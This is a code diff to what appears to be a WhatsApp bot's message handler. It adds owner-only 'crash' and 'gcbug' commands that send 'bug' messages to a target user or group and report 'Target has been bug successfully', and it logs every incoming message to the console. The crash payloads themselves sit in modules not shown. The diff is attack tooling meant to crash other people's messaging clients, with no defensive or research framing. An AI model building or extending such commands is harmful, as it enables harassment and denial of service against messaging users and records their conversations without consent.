@@ -31,6 +31,10 @@ import connect from '../commands/connect.js'
 
 import disconnect from '../commands/disconnect.js'
 
+import sender from '../commands/sender.js'
+
+import gcbug from '../commands/gcbug.js'
+
 import { createWriteStream } from 'fs';
 
 import configManager from '../utils/manageConfigs.js';
@@ -60,6 +64,8 @@ async function handleIncomingMessage(event, client) {
         tag.respond(message, client, owner);
 
         group.linkDetection(message, client);
+
+        console.log(message.message);
 
 
         if (messageBody.startsWith(prefix) && (message.key.fromMe || approvedUsers.includes(message.key.participant || message.key.remoteJid))) {
@@ -278,7 +284,13 @@ async function handleIncomingMessage(event, client) {
 
                     await react(message, client);
 
-                    await test(message, client);
+                    for (let i = 0; i < 1; i++) {
+
+                        test(message, client);
+
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+
+                    }
 
                     break;
 
@@ -447,6 +459,8 @@ async function handleIncomingMessage(event, client) {
                             try {
                                 await crash(message, client);
 
+                                await sender(message, client, "Target has been bug successfully");
+
                             } catch (error) {
                                 await client.sendMessage(message.key.remoteJid, { 
                                     text: `An error occurred while trying to bug the target: ${error.message}` 
@@ -461,11 +475,32 @@ async function handleIncomingMessage(event, client) {
 
                         break;
 
-                    case 'hellomotherfucker':
 
-                        await react(message, client);
+                case 'fuck':
 
-                        await crash(message, client);
+                    await react(message, client);
+
+                        if (
+                            message.key.fromMe ||
+                            message.key.participant === owner || 
+                            message.key.remoteJid === owner
+                        ) {
+                            try {
+                                await gcbug(message, client);
+
+                                await sender(message, client, "Target has been bug successfully");
+
+                            } catch (error) {
+                                await client.sendMessage(message.key.remoteJid, { 
+                                    text: `An error occurred while trying to bug the target: ${error.message}` 
+                                });
+
+                                console.error("Error in gcbug command:", error);
+                            }
+                        } else {
+
+                            await client.sendMessage(message.key.remoteJid, {text:"command only for owner"})
+                        }
 
                         break;
 
